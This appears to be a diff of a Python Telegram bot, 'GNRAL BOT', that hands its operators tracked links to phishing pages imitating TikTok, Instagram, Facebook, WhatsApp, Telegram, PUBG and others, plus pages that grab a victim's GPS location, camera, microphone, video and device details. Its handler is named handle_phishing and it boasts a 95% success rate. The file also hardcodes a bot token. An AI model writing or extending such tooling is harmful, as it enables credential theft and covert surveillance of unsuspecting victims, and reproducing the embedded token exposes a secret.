@@ -1,44 +1,40 @@
-import os, logging
+import os, sys, subprocess, logging
+
+# ========== تثبيت تلقائي للمكتبات ==========
+def ensure_module(package, import_name=None):
+    name = import_name or package
+    try:
+        __import__(name)
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
+
+ensure_module("flask")
+ensure_module("requests")
+ensure_module("pyTelegramBotAPI", "telebot")
+
 from flask import Flask, request
 from telebot import TeleBot, types
 
 # ========== الإعدادات ==========
 TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
 BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
-APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيق البوت
+APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيقك على Render
 
 logging.basicConfig(level=logging.INFO)
 bot = TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-# ========== جميع الصفحات (مرتبة كما تريد) ==========
+# ========== الصفحات (17 زر بالضبط) ==========
 PAGES = [
-    # الصف الأول
-    ("🎵 تيك توك", "tiktok.html"),
-    ("📷 انستقرام", "instagram.html"),
-    # الصف الثاني
-    ("👻 سناب شات", "snapchat.html"),
-    ("📘 فيسبوك", "facebook.html"),
-    # الصف الثالث
-    ("💬 واتساب", "whatsapp.html"),
-    ("✈️ تيليجرام", "telegram.html"),
-    # الصف الرابع
-    ("🐦 تويتر", "twitter.html"),
-    ("▶️ يوتيوب", "youtube.html"),
-    # الصف الخامس
-    ("🎮 ديسكورد", "discord.html"),
-    ("🤖 ريدت", "reddit.html"),
-    # الصف السادس
-    ("🎮 ببجي UC", "pubg_cuc.html"),
-    ("🏆 مسابقة الحلم", "dream.html"),
-    # الصف السابع
-    ("📍 سحب الموقع", "gps.html"),
-    ("📸 فحص الكاميرا", "camera.html"),
-    # الصف الثامن
-    ("🎙️ فحص الميكروفون", "mic.html"),
-    ("🎥 فحص الفيديو", "video.html"),
-    # الصف التاسع (زر واحد عريض)
-    ("📱 فحص مواصفات الجهاز", "device.html"),
+    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
+    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
+    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
+    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
+    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
+    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
+    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
+    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
+    ("📱 فحص مواصفات الجهاز", "device.html")   # الزر الأخير (سيظهر عريضًا)
 ]
 
 # ========== Webhook ==========
@@ -61,20 +57,19 @@ def start(msg):
     chat_id = msg.chat.id
     markup = types.InlineKeyboardMarkup(row_width=2)
 
-    # إضافة جميع الأزرار
+    # إضافة الأزواج (8 أزواج = 16 زر)
     for i in range(0, len(PAGES) - 1, 2):
         left = PAGES[i]
-        right = PAGES[i+1] if i+1 < len(PAGES) else None
+        right = PAGES[i+1]
         markup.row(
             types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
-            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}") if right else None
+            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}")
         )
 
-    # الزر الأخير (فحص الجهاز) عريض
+    # الزر الأخير (فحص الجهاز) بمفرده ليكون عريضًا
     last = PAGES[-1]
     markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
 
-    # رسالة الترحيب مع اسم البوت
     welcome_text = """🔱 <b>GNRAL BOT</b>
 
 🟢 <b>نسبة النجاح:</b> 95%
@@ -85,14 +80,13 @@ def start(msg):
 
     bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="HTML")
 
-# ========== معالج ضغطات الأزرار ==========
+# ========== الضغط على أي صفحة ==========
 @bot.callback_query_handler(func=lambda call: call.data.startswith("ph|"))
 def handle_phishing(call):
     chat_id = call.message.chat.id
     page = call.data.split("|")[1]
     link = f"{BASE_URL}/{page}?chat={chat_id}"
 
-    # إنشاء زر رجوع
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
 
@@ -111,13 +105,12 @@ def handle_back(call):
     chat_id = call.message.chat.id
     markup = types.InlineKeyboardMarkup(row_width=2)
 
-    # إعادة بناء الأزرار
     for i in range(0, len(PAGES) - 1, 2):
         left = PAGES[i]
-        right = PAGES[i+1] if i+1 < len(PAGES) else None
+        right = PAGES[i+1]
         markup.row(
             types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
-            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}") if right else None
+            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}")
         )
 
     last = PAGES[-1]
@@ -131,22 +124,12 @@ def handle_back(call):
 
 اختر المنصة:"""
 
-    bot.edit_message_text(
-        welcome_text,
-        chat_id,
-        call.message.message_id,
-        parse_mode="HTML",
-        reply_markup=markup
-    )
+    bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
     bot.answer_callback_query(call.id)
 
-# ========== تشغيل التطبيق ==========
+# ========== تشغيل ==========
 if __name__ == '__main__':
-    # إعداد webhook
     bot.remove_webhook()
     bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
-    logging.info("✅ Webhook set & bot is running")
-
-    # تشغيل Flask
     PORT = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=PORT)
